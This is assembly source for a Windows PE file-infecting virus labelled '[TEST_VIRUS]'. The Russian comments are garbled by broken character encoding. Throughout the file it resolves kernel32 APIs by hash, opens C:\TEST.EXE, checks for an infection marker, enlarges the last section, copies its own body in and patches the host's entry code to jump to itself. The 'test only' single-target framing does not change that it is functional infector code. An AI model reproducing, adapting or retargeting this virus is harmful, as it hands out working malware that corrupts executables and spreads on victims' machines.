; tasm32 /ml /m3 virus,,
; tlink32 /Tpe /aa /c /x virus,virus,,import32.lib,

        .386p                                   ; ��������� 386+ =)
        .model  flat                            ; 32-� ������ �������� ���
                                                ; ���������
extrn   MessageBoxA:PROC                        ; ������������� 1-��
                                                ; ���������
extrn   ExitProcess:PROC                        ; API-������� :)

virus_size      equ     (offset virus_end-offset virus_start)
jmp_size	equ	(offset jmp_end-offset jmp_start)
;shit_size       equ     (offset delta-offset start)

	.data

szTitle         db      "[����-����� 1.0]",0

szMessage       db      "������ ��������� ������!",10
                db      "��������� �����: C:\TEST.EXE",0

	.code

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; ����� ���� ������, ������������ ��p���� ;)                               ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

virus_start	label	byte

start:
;	pop	dword ptr fs:[0]
        pushad                                  ; �������� � ���� ���
                                                ; ��������
        pushfd                                  ; �������� � ���� �������
                                                ; ������
        call    delta
	nop
delta:
	nop
	pop	ebp
	inc	ebp
;	mov	eax,ebp
	sub	ebp,offset delta

;	sub	eax,shit_size                   ; �������� ���� ������ ��
        mov	eax,dword ptr [ebp+EIP]         ; ����
;	mov     dword ptr [ebp+ModBase],eax

        call    GetAPIs                         ; �������� ��� API-�������
        call    Infect                          ; �������� ����� � ���������
;	call	RestoreFile

	test	ebp,ebp
	jz	fakehost

        popfd                                   ; ��������������� ��� �����
        popad                                   ; ��������������� ���
                                                ; ��������
        mov	eax,00001000h
EIP	equ	$-4

        add     eax,00400000h
ModBase	equ	$-4

        jmp     eax

jmp_start	label	byte

	mov	eax,00401000h
JmpCode	equ	$-4
	jmp	eax

;	push	00401000h
;JmpCode	equ	$-4
;	push	dword ptr fs:[0]
;	mov	fs:[0],esp

;	xor	eax,eax
;	and	[eax],eax

jmp_end		label	byte

RestoreFile:
	nop
	ret

Infect:
        push    dword ptr [ebp+EIP]             ; ��������� EIP � ModBase,
        push    dword ptr [ebp+ModBase]         ; ������������ �� �����
                                                ; ���������
	mov	eax,dword ptr [ebp+EIP]
	mov	eax,dword ptr [ebp+ModBase]

        call    Infection                       ; �������� ��������� ����

        pop     dword ptr [ebp+ModBase]         ; ��������������� ��
        pop     dword ptr [ebp+EIP]

	mov	eax,dword ptr [ebp+EIP]
	mov	eax,dword ptr [ebp+ModBase]

	ret

Infection:
        lea     esi,[ebp+szFileName]            ; �������� ��� ��p��������
                                                ; �����
	push	esi
	call	[ebp+_GetFileAttributesA]	; ������ ��� ��������
	mov	dword ptr [ebp+dwFileAttributes],eax	; ��������� ��

        push    80h                             ; FILE_ATTRIBUTE_NORMAL
        push    esi
        call    [ebp+_SetFileAttributesA]       ; ���p��� ��� ���p�����

        call    OpenFile                        ; ���p����� ���

        inc     eax                             ; ���� EAX = -1, �p�������
        jz      CantOpen                        ; ������
        dec     eax

        mov     dword ptr [ebp+FileHandle],eax  ; ��������� Handle �����

	xor	edx,edx                         ; EDX = 0
	push	edx
	push	eax
	call	[ebp+_GetFileSize]              ; ������ ������ �����

        mov     dword ptr [ebp+nFileSize],eax   ; � ��������� ���

        mov     ecx,dword ptr [ebp+nFileSize]   ; ��-��p���, ��
        call    CreateMap                       ; �������� �����p����� ����

        or      eax,eax
        jz      CloseFile

        mov     dword ptr [ebp+MapHandle],eax

        mov     ecx,dword ptr [ebp+nFileSize]
        call    MapFile                         ; �����p��� ���

        or      eax,eax
        jz      UnMapFile

        mov     dword ptr [ebp+MapAddress],eax

        mov     esi,[eax+3Ch]
        add     esi,eax
        cmp     dword ptr [esi],"EP"            ; ��� PE?
        jnz     NoInfect

        cmp     dword ptr [esi+0F0h],0101010h    ; ��p���� �� �� ���?
        jz      NoInfect

        push    dword ptr [esi+3Ch]

        push    dword ptr [ebp+MapAddress]      ; ���p����� ���
        call    [ebp+_UnmapViewOfFile]

        push    dword ptr [ebp+MapHandle]
        call    [ebp+_CloseHandle]

        pop     ecx

        mov     eax,dword ptr [ebp+nFileSize] ; � ������ ��� �����
        add     eax,virus_size

        call    Align
        xchg    ecx,eax

	push	ecx

        call    CreateMap
        or      eax,eax
        jz      CloseFile

        mov     dword ptr [ebp+MapHandle],eax

	pop	ecx
        call    MapFile

        or      eax,eax
        jz      UnMapFile

        mov     dword ptr [ebp+MapAddress],eax

        mov     esi,[eax+3Ch]
        add     esi,eax

        mov     edi,esi                         ; EDI = ESI = ��������� ��
                                                ; ��������� PE
	
        add     esi,78h                         ; �������� �� ������� ��p-�
        mov     edx,[edi+74h]                   ; EDX = ���������� ��-���
        shl     edx,3                           ; EDX = EDX*8
        add     esi,edx                         ; ESI = ��������� �� ������ ������
	mov	edx,esi
        movzx   eax,word ptr [edi+06h]          ; AX = ���������� ������
        dec     eax                             ; AX--
        imul    eax,eax,28h                     ; EAX = AX*28
        add     esi,eax                         ; ESI = ��������� �� ��������� ������

        mov     ebx,[edi+28h]                   ; �������� EIP
        mov     dword ptr [ebp+EIP],ebx         ; ���p����� ���

	push	esi
	push	edi

 ; ����������� ������
 ; ESI - ��������
 ; EDI - ��������
 ; ECX - ������ ���������� ������

	mov	eax,[edx+0Ch]                   ; EAX = VirtualOffset
	sub	eax,[edx+14h]                   ; EAX = EAX-RawOffset
	sub	ebx,eax
	add     ebx,dword ptr [ebp+MapAddress]  ; EBX = H�p������p������� ��.

        mov     edx,[edi+34h]                   ; EDX = ���� ��p���
        mov     dword ptr [ebp+ModBase],edx     ; ���p����� ��
        add     edx,[esi+0Ch]                   ; EDX = EDX+VirtualOffset
	add	edx,[esi+10h]                   ; EDX = EDX+SizeOfRawData

	mov	esi,ebx                         ; ESI = ��������� �� ������ ���� � �����
        lea     edi,[ebp+buffer]                ; EDI = ��������� �� buffer
        mov     ecx,jmp_size                    ; ECX = �����p ����p����� ������
        rep     movsb                           ; ������ ���!	

        mov     dword ptr [ebp+JmpCode],edx     ; EDX = ��������� �� ����� ������
                                                ;       ��� �� ������ ������
 ; ������ ������
        lea     esi,[ebp+jmp_start]             ; ESI = ��������� �� jmp_start
	mov	edi,ebx                         ; EDI = ��������� �� ������ ���� � �����
        mov     ecx,jmp_size                    ; ECX = �����p ����p����� ������
        rep     movsb                           ; ������ ���!	

	pop	edi
	pop	esi

        mov     edx,[esi+10h]                   ; EDX = SizeOfRawData
        add     edx,[esi+14h]                   ; EDX = EDI+PointerToRawData
	push	edx

        mov     eax,[edi+50h]                   ; EAX = SizeOfImage
	mov	dword ptr [ebp+ImageSize],eax	; ��������� ���
        mov     eax,[esi+08h]                   ; EAX = VirtualSize
	mov	dword ptr [ebp+VSize],eax	; ��������� ���
        mov     eax,[esi+10h]                   ; EAX = SizeOfRawData
	mov	dword ptr [ebp+RSize],eax	; ��������� ���
        add     eax,virus_size                  ; EAX = EAX+VirusSize
        mov     ecx,[edi+3Ch]                   ; ECX = FileAlignment
        call    Align                           ; ��p��������!

        mov     [esi+10h],eax                   ; ����� SizeOfRawData
        mov     [esi+08h],eax                   ; ����� VirtualSize

;        mov     eax,[esi+10h]                   ; EAX = ����� SizeOfRawData
        add     eax,[esi+0Ch]                   ; EAX = EAX+VirtualAddress
        mov     [edi+50h],eax                   ; EAX = ����� SizeOfImage

	mov	eax,[esi+24h]                   ; ����� ������
	mov	dword ptr [ebp+Flags],eax	; ��������� ��
        or      dword ptr [esi+24h],0A0000020h  ; �������� ����� ����� ������

	mov	eax,[edi+0F0h]                  ; Reserved
	mov	dword ptr [ebp+Mark],eax	; ���������
        mov     dword ptr [edi+0F0h],0101010h   ; �������� ����� ��p������

	pop	edi                             ; EDI = ��������� �� ����� ������
	add     edi,dword ptr [ebp+MapAddress]  ; EDI = H�p������p������� ��.
        lea     esi,[ebp+virus_start]           ; ESI = ��������� �� virus_start
        mov     ecx,virus_size                  ; ECX = �����p ����p����� ������
        rep     movsb                           ; ������ ���!

        jmp     UnMapFile                       ; ��������, ���p�����, � �.�.

NoInfect:
        mov     ecx,dword ptr [ebp+nFileSize]
        call    TruncFile

UnMapFile:
        push    dword ptr [ebp+MapAddress]      ; ���p����� ��p�� ��������
        call    [ebp+_UnmapViewOfFile]

CloseMap:
        push    dword ptr [ebp+MapHandle]       ; ���p����� �������
        call    [ebp+_CloseHandle]

CloseFile:
        push    dword ptr [ebp+FileHandle]      ; ���p����� ����
        call    [ebp+_CloseHandle]

CantOpen:
        push    dword ptr [ebp+dwFileAttributes]
        lea     eax,[ebp+szFileName]            ; ������������� ���p��
                                                ; ���p����� �����
        push    eax
        call    [ebp+_SetFileAttributesA]
        ret

 ; ������� ��������� ������� API

GetAPIs         proc
_ReadSEH:
	xor  edx,edx
	mov  eax,fs:[edx]
	dec  edx

_SearchK32:
	cmp  [eax],edx
	je _CheckK32
	mov  eax,dword [eax]
	jmp _SearchK32

_CheckK32:
	mov  eax,[eax+4]
	xor ax,ax

_SearchMZ:          
	cmp word ptr [eax],5A4Dh      ; MZ
	je _CheckPE
	sub eax,10000h
	jmp _SearchMZ

_CheckPE:	
	mov edx,[eax+3ch]
	cmp word ptr [eax+edx],4550h  ; PE
	jne _Exit

_SearchAPI: 
	push esp                      ; ��������� ������������ esp
	push ebp                      ; ��������� ������������ ebp
	mov esi,[eax+edx+78h]         ;Export Table RVA   
	add esi,eax                   ;Export Teble VA
	add esi,18h
	xchg eax,ebx
	lodsd                         ;Num of Name Pointers
	push eax
	lodsd                         ;Address Table RVA
	push eax
	lodsd                         ;Name Pointers RVA 
	push eax 
	add eax,ebx
	push eax                      ;Index
	lodsd                         ;Ordinal Table RVA  
	push eax
	lea edi,[ebp+HeshTable]
	mov ebp,esp

_BeginSearch:
	mov ecx,[ebp+4*4]             ;NumOfNamePointers
	xor edx,edx

_SearchAPIName:          
	mov esi,[ebp+4*1]             ;Index                                                     
	mov esi,[esi]
	add esi,ebx

_GetHash:
	xor  eax,eax
	push eax
_CalcHash:
	ror  eax,7
	xor  [esp],eax
	lodsb
	test al,al
	jnz _CalcHash
	pop eax

_OkHash:
	cmp eax,dword ptr [edi]
	je _OkAPI
	add dword ptr [ebp+4*1],4     ;I=I+4 (I--Index)
	inc edx
	loop _SearchAPIName 
	jmp _Exit                     ; ������� ������� �� ������� :(

_OkAPI:
	shl edx,1
	mov ecx,[ebp]                 ;OrdinalTableRVA
	add ecx,ebx
	add ecx,edx
	mov ecx,[ecx]
	and ecx,0FFFFh
	mov edx,[ebp+4*3]             ;AddressTableRVA
	add edx,ebx
	shl ecx,2
	add edx,ecx
	mov edx,[edx]
	add edx,ebx

	mov eax,[ebp+4*5]
	lea eax,[eax+HeshTable]
	sub eax,edi
	mov ecx,[ebp+4*5]
	lea ecx,[ecx+APITable]
	sub ecx,eax
	mov dword ptr [ecx],edx

;	mov dword ptr [edi],edx       ;���� �� ������������ APITable

	cmp word ptr [edi+4],0FFFFh   ;0FFFFh-End of HeshTable
	je _Exit
	add edi,4

_NextName:          
	mov ecx,[ebp+4*2]             ;NamePointersRVA
	add ecx,ebx
	mov [ebp+4*1],ecx             ;Index
	jmp short _BeginSearch
  	
_Exit:
	mov esp,[ebp+4*6]
	mov ebp,[ebp+4*5]
        ret

GetAPIs         endp

 ; input:
 ;      EAX - ��������, ����p�� ���� ��p������
 ;      ECX - ��p���������� �����p
 ; output:
 ;      EAX - ��p�������� ��������

Align           proc
        push    edx
        xor     edx,edx
        push    eax
        div     ecx
        pop     eax
        sub     ecx,edx
        add     eax,ecx
        pop     edx
        ret
Align           endp

 ; input:
 ;      ECX - ��� ��p����� ����
 ; output:
 ;      H�����

TruncFile       proc
        xor     eax,eax
        push    eax
        push    eax
        push    ecx
        push    dword ptr [ebp+FileHandle]
        call    [ebp+_SetFilePointer]

        push    dword ptr [ebp+FileHandle]
        call    [ebp+_SetEndOfFile]
        ret
TruncFile       endp

 ; input:
 ;      ESI - ��������� �� ��� �����, ����p�� ����� ���p���
 ; output:
 ;      EAX - ����� ����� � ������ ������

OpenFile        proc
        xor     eax,eax
        push    eax
        push    eax
        push    00000003h
        push    eax
        inc     eax
        push    eax
        push    80000000h or 40000000h
        push    esi
        call    [ebp+_CreateFileA]
        ret
OpenFile        endp

 ; input:
 ;      ECX - p����p ��������
 ; output:
 ;      EAX - ����� ��������, ���� ����� �p���� �������

CreateMap       proc
        xor     eax,eax
        push    eax
        push    ecx
        push    eax
        push    00000004h
        push    eax
        push    dword ptr [ebp+FileHandle]
        call    [ebp+_CreateFileMappingA]
        ret
CreateMap       endp

 ; input:
 ;      ECX - �����p
 ; output:
 ;      EAX - ��p�� � ������ ������

MapFile         proc
        xor     eax,eax
        push    ecx
        push    eax
        push    eax
        push    00000002h
        push    dword ptr [ebp+MapHandle]
        call    [ebp+_MapViewOfFile]
        ret
MapFile         endp

mark_   db	"[TEST_VIRUS]",0
;	db	"(c) 2004 BEavER Inc.",0
;	db	"Test only!",0

APITable:
;	_ActivateActCtx		dd ?

	_CreateFileA		dd ?
	_GetFileSize		dd ?
	_GetFileAttributesA	dd ?
	_SetFilePointer		dd ?
	_SetFileAttributesA	dd ?
	_CloseHandle		dd ?
	_CreateFileMappingA	dd ?
	_MapViewOfFile		dd ?
	_UnmapViewOfFile	dd ?
	_SetEndOfFile		dd ?
	_IsDebuggerPresent	dd ?
	_VirtualProtect		dd ?

HeshTable:                                    ;������� ����� �������
;	ActivateActCtx_		dd 0416166F2h

	CreateFileA_		dd 0860B38BCh
	GetFileSize_		dd 0AAC2523Eh
	GetFileAttributesA_	dd 03D7D6496h
	SetFilePointer_		dd 07F3545C6h
	SetFileAttributesA_	dd 0152DC5D4h
	CloseHandle_		dd 0F867A91Eh
	CreateFileMappingA_	dd 01F394C74h
	MapViewOfFile_		dd 0FC6FB9EAh
	UnmapViewOfFile_	dd 0CA036058h
	SetEndOfFile_		dd 0059C5E24h
	IsDebuggerPresent_	dd 0A09252FAh
	VirtualProtect_		dd 015F8EF80h
				dw 0FFFFh     ;End of HeshTable

	OldProtect		dd ?
        RSize			dd ?
        VSize			dd ?
	ImageSize		dd ?
	Flags			dd ?
	Mark			dd ?

	FileHandle              dd ?
	MapHandle               dd ?
	MapAddress              dd ?
	dwFileAttributes	dd ?
	nFileSize		dd ?
	szFileName		db "C:\TEST.EXE",0

	buffer			db jmp_size DUP (0)

;                        align   dword
virus_end	label	byte

 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;
 ; H������� ��p���� ���������                                               ;
 ;-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�-�;

virsus:
;	push	dword ptr fs:[0]
	jmp	start

fakehost:
        popad
        popfd

        xor     eax,eax                         ; ����p����� MessageBox �
        push    eax                             ; ������ ����������
        push    offset szTitle
        push    offset szMessage
        push    eax
        call    MessageBoxA

        push    00h                             ; ����p���� p����� ��������
        call    ExitProcess

end	virsus
